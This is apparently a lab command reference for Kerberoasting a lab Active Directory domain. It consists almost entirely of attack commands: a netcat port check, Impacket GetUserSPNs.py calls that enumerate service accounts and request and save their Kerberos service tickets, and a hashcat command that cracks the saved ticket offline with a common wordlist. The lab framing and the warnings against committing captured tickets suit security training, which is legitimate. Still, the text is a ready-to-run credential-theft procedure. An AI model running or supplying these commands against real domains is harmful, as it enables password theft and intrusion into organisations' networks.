# Kerberoasting Lab — Clean Command Reference

> Replace placeholders with lab credentials locally. Do not commit passwords or captured ticket material.

## 1. Confirm Kerberos connectivity

```bash
nc -vzw3 192.168.56.101 88
```

## 2. Enumerate SPNs as Alice

```bash
python GetUserSPNs.py 'CORP.LOCAL/alice' \
  -dc-ip 192.168.56.101 \
  -dc-host DC01.corp.local
```

## 3. Request the service ticket

```bash
python GetUserSPNs.py 'CORP.LOCAL/alice' \
  -dc-ip 192.168.56.101 \
  -dc-host DC01.corp.local \
  -request
```

## 4. Save ticket material locally

```bash
python GetUserSPNs.py 'CORP.LOCAL/alice' \
  -dc-ip 192.168.56.101 \
  -dc-host DC01.corp.local \
  -request \
  -outputfile sqlservice_tgs.txt
```

Keep `sqlservice_tgs.txt` out of GitHub.

## 5. Offline audit

```bash
hashcat -m 13100 sqlservice_tgs.txt /usr/share/wordlists/rockyou.txt
```

The captured ticket and recovered credential are intentionally excluded from this repository.
